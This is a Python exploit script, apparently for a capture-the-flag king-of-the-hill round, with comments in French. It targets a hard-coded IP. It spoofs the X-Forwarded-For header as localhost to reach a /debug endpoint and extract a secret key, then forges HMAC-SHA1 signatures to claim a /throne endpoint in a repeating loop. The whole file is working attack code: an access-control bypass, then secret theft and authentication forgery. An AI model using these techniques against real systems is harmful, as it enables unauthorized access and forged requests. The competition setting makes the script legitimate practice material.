#!/usr/bin/env python3
# NCTF26 KOTH - re-pull la cle /debug a chaque cycle (gere la rotation), puis signe.
import hmac, hashlib, time, json, re, sys, urllib.request, urllib.error

HOST = "http://13.37.197.230:28490"
TEAM = "242cb7b1d3645528"
INTERVAL = 30          # < expiry 60s, dans la tolerance 45s, PAS du flood

def _get(url, headers):
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req, timeout=5) as r:
        return r.status, r.read().decode(errors="replace")

def fetch_key():
    # /debug ouvert si la requete semble venir de localhost
    code, txt = _get(f"{HOST}/debug", {"X-Forwarded-For": "127.0.0.1"})
    try:                       # cle en JSON ?
        for v in json.loads(txt).values():
            if isinstance(v, str) and re.fullmatch(r"[0-9a-fA-F]{32,64}", v):
                return v
    except Exception:
        pass
    m = re.search(r"[0-9a-fA-F]{40,64}", txt)   # sinon, premiere longue chaine hex
    if m: return m.group(0)
    raise RuntimeError(f"cle introuvable dans /debug -> {code} {txt[:150]}")

def claim(key):
    ts = int(time.time())
    sig = hmac.new(key.encode(), f"{TEAM}|{ts}".encode(), hashlib.sha1).hexdigest()
    body = json.dumps({"team": TEAM, "ts": ts, "sig": sig}).encode()
    req = urllib.request.Request(f"{HOST}/throne", data=body,
             headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status, r.read().decode(errors="replace")[:120]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:120]

hold = "--once" not in sys.argv
n = 0
while True:
    n += 1
    try:
        k = fetch_key()
        code, txt = claim(k)
        print(f"#{n} key={k[:12]}... {code} {txt}")
    except Exception as e:
        print(f"#{n} erreur: {e}")
    if not hold: break
    time.sleep(INTERVAL)
